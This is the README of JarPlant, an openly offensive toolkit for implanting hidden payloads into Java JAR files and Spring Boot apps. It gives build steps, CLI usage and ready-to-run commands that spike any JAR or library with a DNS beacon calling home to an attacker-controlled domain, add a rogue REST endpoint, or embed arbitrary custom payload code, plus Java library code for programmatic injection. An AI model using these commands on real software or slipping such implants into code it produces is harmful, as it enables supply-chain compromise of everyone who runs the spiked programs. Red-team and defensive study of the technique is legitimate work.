# Java Archive Implant Toolkit

Inject malicious payloads into JAR files.

## Quickstart

Building:

```
git clone git@github.com:w1th4d/JarPlant.git
cd JarPlant
mvn package
mv jarplant-cli/target/jarplant-cli-<version>-jar-with-dependencies.jar jarplant.jar
```

Make sure to substitute `<version>` with the current version.

Usage:

```
       _____               ______  __                __   
     _|     |.---.-..----.|   __ \|  |.---.-..-----.|  |_ 
    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|
    |_______||___._||__|  |___|   |__||___._||__|__||____|
    Java archive implant toolkit   v0.1   by w1th4d & kugg

positional arguments:
  command
    class-injector       Inject a class implant  into  any JAR. The implant
                         will detonate whenever  any  class  in  the JAR is
                         used but  the  payload  will  only  run  once  (or
                         possibly twice in  some  very  fringe cases). This
                         is the most versatile implant  type and works with
                         any JAR (even ones  without  a main function, like
                         a library).
    spring-injector      Inject  a  Spring  component   implant  into  JAR-
                         packaged Spring  application.  The  component will
                         be loaded and included in  the Spring context. The
                         component could be  something  like  an extra REST
                         controller or scheduled task.
    implant-list         List all bundled implants.
    implant-info         See more details  about  a  specific implant. This
                         includes reading its  class  to  see all available
                         configuration properties and  their  data types. A
                         class file path can be  specified to read a custom
                         implant.
    decoder              Utility to decode stuff  generated  by some of the
                         built-in payloads.

named arguments:
  -h, --help             show this help message and exit

for more options, see command help pages:
  $ java -jar jarplant.jar class-injector -h
  $ java -jar jarplant.jar spring-injector -h
    ...

example usage:
  $ java -jar jarplant.jar class-injector \
    --target path/to/target.jar --output spiked-target.jar
```

## Quick grabs

These are some examples of things you may be interested in.

Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch or Burp Collaborator):

```shell
java -jar jarplant.jar class-injector \
   --target path/to/target.jar \
   --implant DnsBeaconImplant \
   --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
```

Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band service you use).

Decode the domain name caught by your DNS server:

```shell
java -jar jarplant.jar decoder $ENCODED_FQDN 
```

Replace `$ENCODED_FQDN` with the domain name in the DNS query.

Spike a Spring Boot app to include a rogue REST endpoint:

```shell
java -jar jarplant.jar spring-injector \
   --target path/to/target.jar \
   --implant-component SpringImplantController \
   --implant-config SpringImplantConfiguration 
````

You'll want to modify `StringImplantController.java` for this one do to anything interesting.
The default is to create a REST controller routed to `/implant` that just gives a dummy response.

Spike any JAR with your own custom implant code:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant 
```

Where your custom implant code resides in the `payload()` method of `ClassImplant.java`.

Spike any JAR with an implant that will always finish no matter what:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant
   --config CONF_BLOCK_JVM_SHUTDOWN=true 
```

Be careful with blocking operations in your payload code.

## Configuration

JarPlant supports injection of custom values with the implants.
A set of common configuration properties are defined with the template and built-in implants.
These are:

| Configuration property    | Data type | Description                                                                                                    | Default value     |
|---------------------------|-----------|----------------------------------------------------------------------------------------------------------------|-------------------|
| `CONF_JVM_MARKER_PROP`    | String    | JVM system property to create and use as a "marker" to determine if an implant has been detonated in this JVM. | `java.class.init` |
| `CONF_BLOCK_JVM_SHUTDOWN` | boolean   | Controls whether the implant's thread will block the JVM from fully exiting until the implant is done.         | `false`           |
| `CONF_DELAY_MS`           | int       | Optional delay (in milliseconds) before the implant payload will detonate.                                     | `0`               |

See the `ClassImplant` template Javadoc for mor info in these properties.

### Blocking the JVM exit

Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property.
If this is set to `true`, then the JVM will wait for your payload to finish its execution.
If your payload takes a long time, then the spiked app will fail to exit properly.
It's _not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.

If you've injected an implant into an app that exits very quickly, then your payload may not get enough time to execute
if `CONF_BLOCK_JVM_SHUTDOWN` is set to `false` (which is the default setting).

As a general rule of thumb, only set `CONF_BLOCK_JVM_SHUTDOWN` to `true` if your implant is quick to execute and/or it's
absolutely essential that it _must_ finish.

For any target apps that takes some time to run (like a back-end service), there should be plenty time for your implant
to do its thing with `CONF_BLOCK_JVM_SHUTDOWN` set to its default value of `false`.

## Quickly implement a custom implant

For a one-off in a rush, the simplest and fastest way of getting your own custom Java code into a target JAR is to:

1) Clone this code repository.
2) Modify the `payload()` method inside `ClassImplant.java` with your own code.
3) Build JarPlant: `mvn clean package`.
4) Run the CLI. See the "Quick grabs" section above.

Alternatively, if you're spiking a Spring app: Modify the `SpringComponentImplant.java` (and maybe the
`SpringConfigurationImplant.java`) and use the `spring-injector` CLI accordingly.

## Using the JarPlant library

To invoke JarPlant from your own Java code, first run `mvn clean install` in the root directory of the JarPlant code
repository.
Then, include it in the `pom.xml` (or equivalent) of your own project:

```xml
<dependency>
  <groupId>org.example</groupId>
  <artifactId>jarplant-lib</artifactId>
  <version>1.0-SNAPSHOT</version>
</dependency>
```

These coordinates _will be changed_ soon. It will also be published to Maven Central when it's properly released.

Example usage in your code:

```java
public class Demo {
    public static void main(String[] args) {
        try {
            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            implant.setConfig("CONF_BLOCK_JVM_SHUTDOWN", true);

            Path target = Path.of("target.jar");
            JarFiddler jar = JarFiddler.buffer(target);

            Injector injector = ClassInjector.createLoadedWith(implant);
            boolean succeeded = injector.injectInto(jar);
            if (succeeded) {
                jar.write(target);
            }
        } catch (ClassNotFoundException | IOException | ImplantException |
                 ImplantConfigException e) {
            throw new RuntimeException(e);
        }
    }
}
```

You may want to include the `jarplant-implants` submodule for access to `ClassImplant`:

```xml
<dependency>
    <groupId>org.example</groupId>
    <artifactId>jarplant-implants</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

However, if you write your own code like this, it would be better to copy the `ClassImplant` template into your own
project and customize it according to your needs.
Give it a cool name while you're at it.

You may also introduce new configuration properties. Just make sure they're `public`, `static`, `volatile` and has a
name prefixed with `CONF_`.
If no default value is used for a property, then a value must be provided using `ImplantHandler.setConfig()` before
injection.

## Library components

JarPlant is written as a Java library and framework for you to write your own implants.

There are a number of key components to JarPlant. These are `ImplantHandler`, `JarFiddler` and `Injector`.

### ImplantHandler

This class (its implementation `ImplantHandlerImpl`) is used to find, load and configure implants.

This API is subject to change soon.

### JarFiddler

This class is used to read, modify and write a JAR file.

The default implementation will read and buffer the contents of an entire JAR into memory.
The injectors can then operate upon the `JarFiddler` in-memory.
The user of the JarPlant API is expected to invoke the `write()` method if the injector succeeds.

### Injectors

These are the classes that does most of the bytecode manipulation of classes inside a JAR.

There are different implementations for various types of JARs/apps: `ClassInjector` and `SpringInjector`.

#### ClassInjector

Operates upon any JAR file containing arbitrary classes.
The JAR does _not_ have to be executable or contain a class with a `public static void main(String[] args)` function.
Any class will do. This works for libraries and dependencies, too.

When the target JAR is run or used by another app, the implant will trigger.

#### SpringInjector

Specifically looks for a Spring configuration classes and injects a Spring component in the same package namespace.
If _component scanning_ is not enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated
method in the configuration in order to reference the implanted component.

The Spring implant template will register a new HTTP request mapping for the app.
Requests going to that endpoint (`/implant` by default) will be handled by the implant.
You're encouraged to modify `SpringComponentImplant.java` with your own custom code.

## Implants

JarPlant is intended to serve as a framework for developers to implement their own implants.

The template for the `ClassInjector` is `ClassImplant`.
Please delve into it, read its Javadoc and fill in the `payload()` method appropriately.

The `SpringInjector` uses two different implants: A _Spring component_ implant and a _Spring configuration_ implant.
Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if it's not
necessary.
Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but itt needs to
be supplied explicitly for now.

## Maven modules

This project is divided into a set of Maven modules:

* **jarplant-cli** is where the executable main function is. It gives the user a Command Line Interface to use the
  JarPlant functionality in a user-friendly way.
* **jarplant-implants** is where the various example implants are located. A savvy user is encouraged to write custom
  implants as appropriate.
* **jarplant-lib** is where the main functionality is. This module is designed to contain only the essential
  functionality for portability.
* **test-app-pojo** is a very minimal plain Java app that can be used for test the class implants.
* **test-app-spring-simple** is a simple Spring Boot application for testing the Spring implants.
  It's just a `@SpringBootApplication` with one configuration and controller.
* **test-app-spring-complex** tries to simulate a more intricate Spring app with several `@Configuration` classes in
  different sub-packages. It includes configurations without component scanning enabled, several configurations in
  the same package and other exotic cases worth testing for.
* **test-implant-class** and **test-implant-spring** are used internally for tests.

## Test suite

Testing JAR and bytecode manipulation can be a bit tricky. Please try to include any bug or corner case into its own
Junit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in
a blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.

### Test automation

Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests.
The tests use a combination of dummy classes and "live samples" from the other Maven submodules.
These submodules are set up to build a proper JAR file and then copy it into the resource folder of the tests.
See their `pom.xml` files for details. It's a bit out of the ordinary and may generate some warnings in Maven.  
Just make sure to run `mvn package` in the project root before running any tests in isolation.

The tests in `jarplant-lib` are a mix of unit tests and end-to-end tests.

### Manual testing and troubleshooting

When developing JarPlant or its implants, it's been very useful to use the `javap` tool provided with the JVM.

Example:

```
mkdir /tmp/jarplant-debug
cd /tmp/jarplant-debug
unzip ../path/to/jarfile/my-app.jar

javap -c -v org/example/target/Main.class | less
```

Replace directories and paths as appropriate. The key here is the `javap` command. It's great for disassembling and
peaking into the JVM bytecode. Do this before and after a JarPlant run and investigate the diffs.

Consider to use the manual testing procedure as a tool to narrow down on a bug and then express that bug as a Junit
test. That way, it's easy for someone to fix the bug by satisfying the test. Alternatively, just fix the bug and create
a PL. You can always just create a GitHub Issue to explain the problem if you're unable to express it as a test or fix
it yourself. A reported Issue is better than nothing.

## Future work

There's a lot of work that still needs to be done. See the Issues section on GitHub for more details.

One key point about future work is that *a lot* more testing needs to be done.
We know that JarPlant in its current state will fail to spike many JARs in the wild.
We're also concerned about compatibility between different Java versions.
All of this needs to be set up with test automation.

